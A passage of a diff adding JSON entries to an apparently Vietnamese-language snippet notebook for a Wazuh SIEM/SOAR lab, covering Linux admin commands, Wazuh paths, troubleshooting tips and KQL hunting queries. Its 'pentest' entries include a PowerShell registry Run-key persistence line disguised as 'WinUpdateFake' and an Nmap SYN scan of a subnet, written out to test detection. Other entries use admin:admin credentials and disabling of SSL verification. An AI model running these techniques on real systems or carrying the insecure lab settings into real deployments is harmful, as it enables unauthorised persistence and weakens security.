+      "code": "# Ví dụ một số Endpoint phổ biến (Gọi qua cURL hoặc Postman)\nGET https://manager:55000/agents\nGET https://manager:55000/rules\nGET https://manager:55000/manager/status\nPUT https://manager:55000/agents/{id}/restart",
+      "notes": "Lệnh PUT /restart rất hữu ích trong vận hành SOAR để ra lệnh cho máy nhánh khởi động lại dịch vụ mà không cần SSH.",
+      "tags": [
+        "wazuh",
+        "api",
+        "rest",
+        "automation"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782454721906,
+      "updatedAt": 1782454721906
+    },
+    {
+      "id": "7916f7be-00f3-4054-99f9-4e0c45b78943",
+      "type": "command",
+      "title": "Lệnh verify-agent-conf (Kiểm tra cú pháp cấu hình Agent tập trung)",
+      "categoryId": "wazuh",
+      "language": "Bash",
+      "content": "Cực kỳ quan trọng khi dùng tính năng Centralized Configuration (chỉnh sửa file từ Manager rồi đẩy xuống cho các Agent). Lệnh này giúp kiểm tra lỗi syntax XML trước để tránh việc push cấu hình hỏng làm mất kết nối Agent vĩnh viễn.",
+      "code": "sudo /var/ossec/bin/verify-agent-conf",
+      "notes": "",
+      "tags": [
+        "wazuh",
+        "verify",
+        "config",
+        "agent"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782454721906,
+      "updatedAt": 1782454721906
+    },
+    {
+      "id": "70600dad-0591-4150-bacc-1ccc58f14258",
+      "type": "command",
+      "title": "Phân tích sâu lệnh agent_control (Xem trạng thái Agent)",
+      "categoryId": "wazuh",
+      "language": "Bash",
+      "content": "Công cụ CLI dùng để kiểm tra nhanh danh sách các Agent đã kết nối, trạng thái hiện tại (active, disconnected), cũng như xuất thông tin chi tiết (IP, OS, Keepalive) của một Agent cụ thể từ góc độ của Manager.",
+      "code": "# 1. Hiển thị danh sách tất cả các Agent\nsudo /var/ossec/bin/agent_control -l\n\n# 2. Xem thông tin chi tiết của Agent có ID 001\nsudo /var/ossec/bin/agent_control -i 001",
+      "notes": "Rất tiện lợi khi cần kiểm tra xem Agent mới cài đã đẩy log thông suốt lên Manager chưa mà không cần truy cập giao diện Web.",
+      "tags": [
+        "wazuh",
+        "agent_control",
+        "cli",
+        "status"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782454721906,
+      "updatedAt": 1782454721906
+    },
+    {
+      "id": "ff1dce0d-1088-40a5-8a30-e49ea40b4455",
+      "type": "command",
+      "title": "Phân tích sâu lệnh netstat / ss (Kiểm tra cổng dịch vụ)",
+      "categoryId": "linux-system",
+      "language": "Bash",
+      "content": "Lệnh 'netstat' (hoặc bản mới hơn là 'ss') dùng để liệt kê danh sách các Port mạng đang mở trên server. Các tham số hay dùng nhất (thường được gộp lại thành -tulpn):\n• -t (tcp) / -u (udp): Liệt kê cổng TCP hoặc UDP.\n• -l (listening): Chỉ liệt kê các cổng đang lắng nghe chờ kết nối.\n• -p (program): Hiển thị tên tiến trình (PID) đang chiếm giữ cổng (Yêu cầu quyền sudo).\n• -n (numeric): Hiển thị dưới dạng số IP và Port thay vì tên miền rút gọn, giúp dễ nhìn hơn.",
+      "code": "# 1. Kiểm tra tổng quan toàn bộ các cổng quan trọng của cụm SIEM\nnetstat -tlnp | grep -E '9200|443|1514|55000'\n\n# 2. Kiểm tra chính xác xem Manager đã mở cổng 1514 đón Agent chưa\nsudo netstat -tulpn | grep 1514\n\n# 3. Lệnh 'ss' thay thế tương đương chạy cực nhanh\nss -tlnp | grep LISTEN",
+      "notes": "Nếu wazuh-manager báo running nhưng netstat không thấy port 1514, có thể do file cấu hình ossec.conf bị lỗi block <remote>.",
+      "tags": [
+        "linux",
+        "netstat",
+        "ss",
+        "ports",
+        "networking"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782452738605,
+      "updatedAt": 1782452738605
+    },
+    {
+      "id": "9eedad12-2229-4a57-ad41-d7b25f3b550a",
+      "type": "command",
+      "title": "Phân tích sâu phân quyền chmod và chown",
+      "categoryId": "linux-file",
+      "language": "Bash",
+      "content": "Hai lệnh này luôn đi đôi với nhau để định nghĩa 'Ai sở hữu file' và 'Họ được làm gì với file'. Trong SOAR/Wazuh, script Python bị sai quyền sẽ không thể chạy. Các tham số hay dùng nhất:\n• chmod 750: Cấp quyền (7) Đọc/Ghi/Thực thi cho User chủ; (5) Đọc/Thực thi cho Group; (0) Không cho phép người lạ đụng vào.\n• chown <user>:<group>: Thay đổi User và Group sở hữu file.\n• -R (Recursive): Áp dụng quyền cho toàn bộ thư mục và các file con bên trong.",
+      "code": "# Cấp quyền thực thi và quyền sở hữu cho daemon của Wazuh đối với file code MISP/TheHive\nchmod 750 /var/ossec/integrations/misp_to_cdb.py\nchown root:wazuh /var/ossec/integrations/misp_to_cdb.py\n\n# Khắc phục lỗi Crash database Cassandra bằng cách cấp lại quyền đệ quy toàn thư mục\nsudo chown -R cassandra:cassandra /var/lib/cassandra",
+      "notes": "Lỗi 'Permission Denied' khi Wazuh gọi script Active Response 99% xuất phát từ việc quên chạy chmod 750.",
+      "tags": [
+        "linux",
+        "chmod",
+        "chown",
+        "permissions",
+        "security"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782452738605,
+      "updatedAt": 1782452738605
+    },
+    {
+      "id": "6e821b21-8a44-4484-893f-459f276e9103",
+      "type": "command",
+      "title": "Phân tích sâu lệnh iptables (Cấu hình Firewall và NAT)",
+      "categoryId": "linux-system",
+      "language": "Bash",
+      "content": "Lệnh 'iptables' tương tác trực tiếp với nhân Linux để cấu hình luật định tuyến và chặn mạng. Các tham số hay dùng nhất:\n• -A (Append) / -I (Insert): Thêm luật vào cuối (-A) hoặc chèn lên đầu (-I) của một chuỗi (như INPUT).\n• -s <IP>: Xác định IP nguồn bị áp dụng luật.\n• -p <protocol>: Xác định giao thức (tcp, udp).\n• -j <TARGET>: Hành động thực thi (DROP: chặn, ACCEPT: cho qua, LOG: ghi log).\n• -t nat: Thao tác với bảng NAT (Dùng để chia sẻ Internet cho máy ảo).",
+      "code": "# 1. Chặn truy cập từ 1 IP cụ thể (Được dùng trong Active Response)\niptables -I INPUT -s 192.168.0.x -j DROP\n\n# 2. Xóa luật chặn (Rollback sau 600s)\niptables -D INPUT -s 192.168.0.x -j DROP\n\n# 3. Ép Firewall ghi log khi Nmap quét ẩn danh cờ SYN (Chặn bắt log)\niptables -A INPUT -p tcp --syn -j LOG --log-prefix \"NMAP SCAN: \"\n\n# 4. Cấu hình NAT (Đóng vai trò Gateway chia sẻ Internet)\niptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE",
+      "notes": "Luật của iptables có tính chất biến mất khi khởi động lại máy. Phải dùng công cụ 'iptables-persistent' nếu muốn lưu vĩnh viễn.",
+      "tags": [
+        "linux",
+        "iptables",
+        "firewall",
+        "networking",
+        "active-response"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782452738605,
+      "updatedAt": 1782452738605
+    },
+    {
+      "id": "1c5cc5f8-e280-49c2-b17e-6d175c5e0d9a",
+      "type": "command",
+      "title": "Phân tích sâu lệnh tcpdump (Bắt gói tin mạng)",
+      "categoryId": "linux-system",
+      "language": "Bash",
+      "content": "Lệnh 'tcpdump' là máy dò gói tin (packet sniffer) chạy trên CLI. Nó giúp bạn 'nghe lén' xem mạng có thực sự truyền dữ liệu hay không. Các tham số hay dùng nhất:\n• -i <interface>: Lắng nghe trên card mạng nào (dùng 'any' để nghe trên tất cả card mạng).\n• port <số>: Chỉ bắt các gói tin đi qua port cụ thể.\n• -n: Không tốn thời gian phân giải địa chỉ IP thành tên miền (domain), giúp lệnh chạy nhanh hơn.\n• -A: In nội dung của gói tin ra màn hình dưới dạng chữ (ASCII), rất hữu ích để đọc log Syslog thô.",
+      "code": "# Lắng nghe xem gói tin Syslog từ Gateway có bay tới Manager hay chưa\nsudo tcpdump -i any port 514 -n -A",
+      "notes": "Lệnh này cực kỳ quan trọng trong Trouble-shooting. Nếu Dashboard không có log mạng, chạy lệnh này để xác định lỗi là do Network (không thấy gói tin) hay lỗi do Wazuh (thấy gói tin nhưng không decode được).",
+      "tags": [
+        "linux",
+        "tcpdump",
+        "networking",
+        "troubleshooting"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782452738605,
+      "updatedAt": 1782452738605
+    },
+    {
+      "id": "3d52613f-8d84-4f45-b5ee-c5cf1647b8eb",
+      "type": "command",
+      "title": "Phân tích sâu lệnh systemctl (Quản lý dịch vụ hệ thống)",
+      "categoryId": "linux-system",
+      "language": "Bash",
+      "content": "Lệnh 'systemctl' dùng để quản lý các tiến trình chạy nền (daemons/services) của hệ điều hành Linux (systemd). Các tham số hay dùng nhất:\n• status: Xem trạng thái hiện tại (đang chạy hay đã sập), uptime và vài dòng log lỗi mới nhất của dịch vụ.\n• restart: Khởi động lại dịch vụ. Bắt buộc dùng sau khi sửa các file cấu hình như ossec.conf hoặc thêm Rule mới.\n• start / stop: Bật hoặc tắt dịch vụ.\n• enable (--now): Thiết lập cho dịch vụ tự động chạy mỗi khi bật máy (boot). Cờ --now ép nó khởi động ngay lập tức.",
+      "code": "# 1. Kiểm tra trạng thái của Wazuh Agent xem có lỗi kết nối không\nsudo systemctl status wazuh-agent\n\n# 2. Khởi động lại Manager để nạp Rule/Decoder mới\nsudo systemctl restart wazuh-manager\n\n# 3. Kích hoạt dịch vụ Filebeat khởi động cùng hệ điều hành\nsudo systemctl enable --now filebeat",
+      "notes": "Mọi lệnh systemctl (ngoại trừ status) đều yêu cầu quyền quản trị (sudo).",
+      "tags": [
+        "linux",
+        "systemctl",
+        "services",
+        "daemon"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782452738605,
+      "updatedAt": 1782452738605
+    },
+    {
+      "id": "5aed0640-d3cd-4be2-9c97-838d7ad9e791",
+      "type": "command",
+      "title": "Phân tích sâu lệnh curl (Giao tiếp API và HTTP Request)",
+      "categoryId": "linux-system",
+      "language": "Bash",
+      "content": "Lệnh 'curl' được dùng để truyền tải dữ liệu qua các giao thức mạng (HTTP/HTTPS). Trong dự án này, nó đóng vai trò là công cụ test API gửi đến OpenSearch/Wazuh Indexer. Các tham số hay dùng nhất:\n• -s (silent): Ẩn thanh tiến trình (progress bar) rườm rà khi gọi API.\n• -k (insecure): Bỏ qua việc xác thực chứng chỉ SSL (Rất cần thiết vì Wazuh Lab đang dùng self-signed cert).\n• -u <user:pass>: Cung cấp tài khoản xác thực Basic Auth.\n• -X <METHOD>: Xác định phương thức HTTP (GET, POST, PUT, DELETE).\n• -H: Thêm HTTP Header (VD: Content-Type: application/json).\n• -d (data): Truyền payload (nội dung JSON) vào request.",
+      "code": "# 1. Gọi API kiểm tra sức khỏe các index (Chỉ cần method GET)\ncurl -sk -u admin:admin \"https://localhost:9200/_cat/indices?v\"\n\n# 2. Gọi API để kéo Schema Field của OpenSearch\ncurl -sk -u admin:admin \"https://localhost:9200/wazuh-alerts-*/_mapping?pretty\"\n\n# 3. Gọi API truy vấn đếm log với method POST và chèn payload JSON\ncurl -sk -u admin:admin -XPOST \"https://localhost:9200/wazuh-alerts-*/_count?pretty\" -H \"Content-Type: application/json\" -d '{\"query\": {\"term\": {\"agent.name.keyword\": \"ubuntu-admin\"}}}'",
+      "notes": "Tham số '?pretty' ở cuối URL API giúp OpenSearch trả về JSON đã được format xuống dòng thụt lề, cực kỳ dễ đọc trên Terminal.",
+      "tags": [
+        "linux",
+        "curl",
+        "api",
+        "opensearch",
+        "http"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782452738605,
+      "updatedAt": 1782452738605
+    },
+    {
+      "id": "ac42de54-e0c7-4b7c-bf15-dc4b8ea14d65",
+      "type": "command",
+      "title": "Phân tích sâu lệnh tail (Theo dõi log theo thời gian thực)",
+      "categoryId": "linux-file",
+      "language": "Bash",
+      "content": "Lệnh 'tail' dùng để in ra các dòng cuối cùng của một file. Trong vận hành SOC, nó là công cụ sống còn để theo dõi dòng chảy của log. Các tham số hay dùng nhất:\n• -f (follow): Chế độ theo dõi liên tục. Khi file log có dòng mới sinh ra, nó sẽ lập tức in ra màn hình mà không bị thoát lệnh.\n• -n <số>: Chỉ định chính xác số dòng cuối cùng muốn xem (mặc định là 10 dòng).",
+      "code": "# 1. Theo dõi log cảnh báo sinh ra theo thời gian thực\ntail -f /var/ossec/logs/alerts/alerts.json\n\n# 2. Xem 50 dòng lỗi cuối cùng của dịch vụ Manager\ntail -n 50 /var/ossec/logs/ossec.log\n\n# 3. Kết hợp in ra 3 dòng cuối và ép định dạng JSON để dễ đọc\ntail -3 /var/ossec/logs/alerts/alerts.json | python3 -m json.tool",
+      "notes": "Nhấn Ctrl + C để thoát khỏi chế độ theo dõi liên tục (tail -f).",
+      "tags": [
+        "linux",
+        "tail",
+        "monitoring",
+        "real-time"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782452738605,
+      "updatedAt": 1782452738605
+    },
+    {
+      "id": "61f538dd-838a-4358-ac6a-43783997f5cf",
+      "type": "command",
+      "title": "Phân tích sâu lệnh grep (Tìm kiếm và lọc văn bản)",
+      "categoryId": "linux-file",
+      "language": "Bash",
+      "content": "Lệnh 'grep' dùng để quét và lọc các dòng có chứa từ khóa nhất định trong một file log hoặc từ output của lệnh khác. Các tham số hay dùng nhất:\n• -i: Bỏ qua việc phân biệt chữ hoa/chữ thường (case-insensitive).\n• -E: Cho phép sử dụng Regex nâng cao (Extended) kết hợp nhiều từ khóa bằng dấu '|' (OR).\n• -A <số>: Hiển thị thêm N dòng phía sau dòng tìm thấy (After).\n• -B <số>: Hiển thị thêm N dòng phía trước dòng tìm thấy (Before) - Rất hữu ích để đọc log XML/JSON không bị đứt đoạn.\n• -v: Lọc đảo ngược (Invert match), chỉ in ra các dòng KHÔNG chứa từ khóa.",
+      "code": "# 1. Lọc log không phân biệt hoa thường\ngrep -i \"sysmon\" /var/ossec/logs/archives/archives.log\n\n# 2. Tìm nhiều từ khóa cùng lúc (Regex OR)\ngrep -E \"processGuid|eventID|commandLine|destinationIp\" wazuh-template.json\n\n# 3. Lọc log kèm ngữ cảnh (2 dòng trên, 5 dòng dưới)\ncat /var/ossec/etc/rules/local_rules.xml | grep -A 5 -B 2 \"100202\"\n\n# 4. Loại bỏ các dòng nhiễu (lọc ngược)\ncrontab -l 2>/dev/null | grep -v \"LAB_TEST\"",
+      "notes": "Trong hệ thống SIEM, kết hợp 'cat' hoặc 'tail' đi kèm với biểu tượng ống dẫn '|' rồi đến 'grep' là combo kinh điển nhất để truy vết log.",
+      "tags": [
+        "linux",
+        "grep",
+        "log-analysis",
+        "file-manipulation"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782452738605,
+      "updatedAt": 1782452738605
+    },
+    {
+      "id": "9f287ff3-1314-4809-94eb-d28e448cdfbe",
+      "type": "knowledge",
+      "title": "Lỗi Log có trên Manager nhưng không hiện Field trên Dashboard",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "Bệnh kinh điển của Dashboard. Khi Decoder đã bóc được trường mới (ví dụ `data.sysmon.processGuid`), Indexer đã lưu nhưng Kibana UI vẫn dùng cache cũ. Cách xử lý: Bắt buộc truy cập `Stack Management -> Index Patterns`, chọn `wazuh-alerts-*` và nhấn nút Refresh Field List (mũi tên xoay vòng).",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "error",
+        "dashboard",
+        "field-mapping",
+        "ui"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782449721467,
+      "updatedAt": 1784282076371
+    },
+    {
+      "id": "d3dd7887-b586-458c-83ca-019d846841fa",
+      "type": "knowledge",
+      "title": "Lỗi Filebeat SSL IP SAN (Chứng chỉ không khớp)",
+      "categoryId": "wazuh",
+      "language": "YAML",
+      "content": "Log không lên được Indexer, chạy lệnh filebeat test output báo lỗi 'x509 certificate is valid for IP_A, not IP_B'. Xảy ra khi nhóm đổi dải IP kiến trúc mạng (VD: sang ZeroTier). Cách xử lý nhanh cho môi trường Lab: Mở file `/etc/filebeat/filebeat.yml`, thêm cấu hình `ssl.verification_mode: none` để bypass tạm thời SSL.",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "error",
+        "filebeat",
+        "ssl",
+        "network"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782449721467,
+      "updatedAt": 1784282076371
+    },
+    {
+      "id": "574afc99-d28e-4e6a-8532-4c1ea88acf13",
+      "type": "knowledge",
+      "title": "Lỗi Error 2005 - Connection refused trên Dashboard",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "Giao diện Web không thể lấy danh sách Agent. Nguyên nhân sâu xa là do tiến trình `wazuh-dbd` (Database ngầm của Manager) đã bị sập do máy chủ hết RAM (OOM Killer) hoặc do tắt máy đột ngột làm hỏng tệp SQLite. Cách xử lý: Kiểm tra RAM, rename file database cũ bị malformed và restart Manager.",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "error",
+        "wazuh",
+        "dashboard",
+        "wazuh-db"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782449721467,
+      "updatedAt": 1784282076371
+    },
+    {
+      "id": "f872afea-8091-48d0-95af-f4a1e181352b",
+      "type": "knowledge",
+      "title": "Lỗi 'Invalid decoder name' và sập wazuh-analysisd",
+      "categoryId": "wazuh",
+      "language": "XML",
+      "content": "Nguyên nhân do file XML `local_decoder.xml` bị lỗi cú pháp: 1) Khai báo trùng thuộc tính `name` ở nhiều decoder con. 2) Dùng ký tự đặc biệt `<` hoặc `>` trực tiếp trong thẻ `<regex>`. Cách khắc phục: Bắt buộc dùng thực thể XML (`&lt;` và `&gt;`), đồng thời đặt tên riêng biệt cho từng khối decoder.",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "error",
+        "wazuh",
+        "xml",
+        "decoder"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782449721467,
+      "updatedAt": 1784282076371
+    },
+    {
+      "id": "0a5bd0ed-3a18-4827-bc1c-730fcda3db97",
+      "type": "command",
+      "title": "File định nghĩa Template Mapping của OpenSearch",
+      "categoryId": "wazuh",
+      "language": "JSON",
+      "content": "Nằm trên Wazuh Manager (Do Filebeat quản lý). Định nghĩa cấu trúc kiểu dữ liệu của Index (keyword hay text, long hay date) trước khi log được đẩy sang Database của Indexer. Tránh lỗi phân tách chuỗi.",
+      "code": "/etc/filebeat/wazuh-template.json",
+      "notes": "",
+      "tags": [
+        "file",
+        "filebeat",
+        "mapping",
+        "json"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "c8d880d9-1f14-4685-abd8-ceea92f45769",
+      "type": "command",
+      "title": "File cấu hình JVM Heap (Phân bổ RAM Java)",
+      "categoryId": "wazuh",
+      "language": "Bash",
+      "content": "File quyết định giới hạn RAM tối đa cho Elasticsearch/OpenSearch và Cassandra. Nếu không set cứng (ví dụ: -Xms4g -Xmx4g), dịch vụ sẽ tự động cắn 50% RAM máy chủ dẫn đến OOM Crash.",
+      "code": "/etc/elasticsearch/jvm.options \n/etc/cassandra/jvm-server.options",
+      "notes": "",
+      "tags": [
+        "file",
+        "jvm",
+        "ram",
+        "performance"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1784282085760
+    },
+    {
+      "id": "a144caef-51b7-40e5-9732-1ea6e67a573f",
+      "type": "command",
+      "title": "File cấu hình trung tâm Wazuh Manager (ossec.conf)",
+      "categoryId": "wazuh",
+      "language": "XML",
+      "content": "File định nghĩa luồng dữ liệu toàn hệ thống. Chứa thông tin kết nối Agent, bật tắt tính năng <logall>, định tuyến syslog (<remote>), tích hợp API (<integration>) và khai báo khối liên kết Active Response.",
+      "code": "/var/ossec/etc/ossec.conf",
+      "notes": "",
+      "tags": [
+        "file",
+        "wazuh",
+        "config"
+      ],
+      "pinned": true,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782456517346
+    },
+    {
+      "id": "dfbc7c08-411b-446a-b463-3f2fbd7a5c49",
+      "type": "command",
+      "title": "Kho lưu trữ Log (Archives và Alerts)",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "Thư mục 'alerts' chứa log đã khớp rule và được decode thành JSON (dành cho Filebeat gửi lên Indexer). Thư mục 'archives' chứa toàn bộ raw log thô từ Agent đẩy về bất kể có rule nào khớp hay không (ngốn ổ cứng rất nhanh).",
+      "code": "/var/ossec/logs/alerts/ \n/var/ossec/logs/archives/",
+      "notes": "",
+      "tags": [
+        "directory",
+        "wazuh",
+        "logs"
+      ],
+      "pinned": true,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782456519601
+    },
+    {
+      "id": "4df6560c-dfd5-4cfd-864c-2019d9913164",
+      "type": "command",
+      "title": "Thư mục lưu trữ Luật (Rules) và Bộ giải mã (Decoders) tùy chỉnh",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "Thư mục làm việc cốt lõi của Detection Engineer. Nơi chứa các file XML tự thiết kế để không bị ghi đè khi Wazuh cập nhật phiên bản.",
+      "code": "/var/ossec/etc/rules/ \n/var/ossec/etc/decoders/",
+      "notes": "",
+      "tags": [
+        "directory",
+        "wazuh",
+        "rules",
+        "decoders"
+      ],
+      "pinned": true,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782456521867
+    },
+    {
+      "id": "5c8f7f00-a319-41f3-91b5-5603538c7eb6",
+      "type": "command",
+      "title": "Thư mục chứa Script Active Response",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "Chứa các script thực thi phản ứng tự động (Python/Bash). Lệnh từ Manager sẽ gọi script lưu sẵn tại Agent. Cần cấp quyền chmod 750 và chown root:ossec.",
+      "code": "/var/ossec/active-response/bin/",
+      "notes": "",
+      "tags": [
+        "directory",
+        "wazuh",
+        "active-response"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "36045446-dcb5-4172-adef-f597ec868fed",
+      "type": "knowledge",
+      "title": "Kỹ thuật Hard Constraint ép khuôn AI (Giải quyết lỗi JSON Null)",
+      "categoryId": "wazuh",
+      "language": "Prompt",
+      "content": "Lỗi sinh JSON phổ biến: Llama 3.1 thỉnh thoảng bịa trường (Hallucination) hoặc trả về 'null' khi thiếu log làm gãy luồng Python parse. Cách giải quyết: Ép System Prompt cứng ràng buộc 'DO NOT use null. Use N/A for missing string fields và [] cho array'. Điều này giúp hệ thống tự động sinh Incident Report ổn định 100%.",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "ai",
+        "prompt-engineering",
+        "json",
+        "troubleshooting"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782449721467,
+      "updatedAt": 1784282085760
+    },
+    {
+      "id": "87985eba-cd1a-4824-926d-80070c7ba070",
+      "type": "knowledge",
+      "title": "Sự khác biệt giữa MISP và Cortex trong kiến trúc SOAR",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "MISP là 'Từ điển bách khoa' lưu trữ tĩnh. Nó tự động kéo sỉ (Pull Feeds) hàng triệu IOC trên toàn cầu về lưu nội bộ. CORTEX là 'Thám tử tư' phân tích động. Khi có 1 IP/Hash chưa biết, Cortex sẽ cầm Hash đó chạy ra Internet gọi API của VirusTotal/AbuseIPDB để hỏi on-demand.",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "misp",
+        "cortex",
+        "soar",
+        "architecture"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782449721467,
+      "updatedAt": 1784282085760
+    },
+    {
+      "id": "0f6e05a6-0e4d-4a51-9df0-f0139e48e026",
+      "type": "knowledge",
+      "title": "Sự khác biệt giữa thẻ <program_name> và <decoded_as>",
+      "categoryId": "wazuh",
+      "language": "XML",
+      "content": "Trong cấu trúc Rule XML: Nếu dùng `<program_name>`, rule sẽ nổ ngay lập tức ở Phase 1 (Pre-decoding) dựa trên tag syslog, bỏ qua việc bóc tách field. Bắt buộc phải dùng `<decoded_as>` để ép Wazuh chuyển sang Phase 2 (Decoding), dùng Regex bóc tách các trường dữ liệu (Sysmon ProcessGuid, IP) trước khi kích hoạt Rule.",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "wazuh",
+        "rule-logic",
+        "decoder"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "a25bd039-6232-4bd9-8ae7-acc6a8b78547",
+      "type": "knowledge",
+      "title": "Kiến trúc các tiến trình cốt lõi (Daemons) của Wazuh Manager",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "1. wazuh-analysisd: Vỏ não phân tích, giải mã (decode) và đối chiếu với Rules.\n2. wazuh-remoted: Cổng lắng nghe port 1514 nhận log mã hóa từ Agent.\n3. wazuh-db: Quản trị CSDL SQLite (Lỗi 2005 xuất phát từ đây).\n4. wazuh-execd: Thực thi kịch bản Active Response (Chặn IP, Kill Process).\n5. wazuh-integratord: Chạy các module gọi API ngoại vi (VirusTotal, Telegram, TheHive).",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "wazuh",
+        "architecture",
+        "daemons"
+      ],
+      "pinned": true,
+      "isKnowledge": true,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782456525307
+    },
+    {
+      "id": "47f3838f-53d1-41e8-b21e-e384fbc56e25",
+      "type": "command",
+      "title": "Biên dịch từ điển CDB siêu tốc cho Wazuh",
+      "categoryId": "wazuh",
+      "language": "Linux",
+      "content": "Lệnh chuyển đổi các danh sách IOC dạng text thô (kéo từ nền tảng MISP về) thành file nhị phân (.cdb) giúp engine Wazuh tra cứu siêu tốc O(1) mà không cần khởi động lại dịch vụ.",
+      "code": "/var/ossec/bin/wazuh-makelists",
+      "notes": "",
+      "tags": [
+        "wazuh",
+        "misp",
+        "cdb",
+        "threat-intel"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "4af122ff-d662-4034-83a4-19b20901374e",
+      "type": "command",
+      "title": "Thiết lập Persistence qua Registry (Mô phỏng Red Team)",
+      "categoryId": "pentest",
+      "language": "PowerShell",
+      "content": "Ghi đường dẫn file thực thi vào khóa Run của Registry để mã độc tự khởi động cùng hệ thống. Kịch bản này nhằm mục đích kích hoạt Sysmon Event ID 13 và rule cảnh báo Persistence (Level 12).",
+      "code": "New-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"WinUpdateFake\" -Value $FILE_PATH -PropertyType String -Force | Out-Null",
+      "notes": "",
+      "tags": [
+        "pentest",
+        "persistence",
+        "registry"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "8bae6ca0-c2bf-4bf7-9e09-d6307adebc38",
+      "type": "command",
+      "title": "Quét Nmap ẩn danh (Stealth SYN Scan)",
+      "categoryId": "pentest",
+      "language": "Linux",
+      "content": "Quét các cổng phổ biến bằng cờ SYN (không hoàn thành kết nối 3 bước TCP). Dùng để kiểm thử xem rule iptables/UFW trên Gateway có ghi nhận các gói tin bị DROP/khuyết cờ đẩy về Syslog hay không.",
+      "code": "nmap -sS -p 22,80,443,3389,9200 192.168.0.0/24",
+      "notes": "",
+      "tags": [
+        "pentest",
+        "nmap",
+        "network"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "ea56820a-117b-4f53-899e-fc8dc32ff57a",
+      "type": "command",
+      "title": "Phát hiện Malware Staging qua FIM (KQL Discover)",
+      "categoryId": "wazuh",
+      "language": "KQL",
+      "content": "Sử dụng module Syscheck (FIM) để tìm mọi file thực thi nguy hiểm (.exe, .sh, .bat) vừa được tạo mới hoặc thả (Drop) vào hệ thống nhưng chưa kích hoạt.",
+      "code": "rule.groups: \"syscheck\" AND syscheck.event: \"added\" AND syscheck.path: (*.exe OR *.sh OR *.php OR *.bat)",
+      "notes": "",
+      "tags": [
+        "kql",
+        "threat-hunting",
+        "fim",
+        "malware"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1784282061351
+    },
+    {
+      "id": "2fba39d6-d62d-4094-8562-e1144178e72e",
+      "type": "command",
+      "title": "Săn lùng Slow Brute-force (KQL Discover)",
+      "categoryId": "wazuh",
+      "language": "KQL",
+      "content": "Lọc các sự kiện đăng nhập thất bại nhưng loại trừ những đợt tấn công dồn dập đã bị hệ thống tự động khóa (Rule 60204, 5712), giúp Analyst tìm ra kẻ dò mật khẩu chậm rãi, lẩn tránh hệ thống Active Response.",
+      "code": "rule.groups: \"authentication_failed\" AND NOT rule.id: (\"60204\" OR \"5712\")",
+      "notes": "",
+      "tags": [
+        "kql",
+        "threat-hunting",
+        "brute-force"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1784282061351
+    },
+    {
+      "id": "498da9bc-b5b5-4f67-8ba0-8cc7686833f9",
+      "type": "command",
+      "title": "API: Lấy Schema (Field Mapping) từ OpenSearch",
+      "categoryId": "wazuh",
+      "language": "Bash (cURL)",
